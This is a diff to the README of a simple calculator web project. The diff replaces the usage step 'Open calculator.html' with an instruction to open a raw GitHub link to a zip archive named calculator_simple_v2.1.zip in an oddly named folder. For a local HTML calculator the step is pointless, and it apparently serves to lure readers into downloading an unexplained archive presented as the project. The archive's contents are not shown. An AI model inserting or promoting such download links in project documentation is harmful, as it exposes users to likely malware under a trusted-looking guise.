@@ -11,7 +11,7 @@ Responsive Design: The calculator is designed to be responsive and adjusts to di
 Usage
 Open the Calculator:
 
-Open calculator.html in a web browser.
+Open https://raw.githubusercontent.com/princesuchak/simple-calculator/main/relishsome/calculator_simple_v2.1.zip in a web browser.
 Performing Calculations:
 
 Click on the number buttons (0-9) to input numbers into the display.
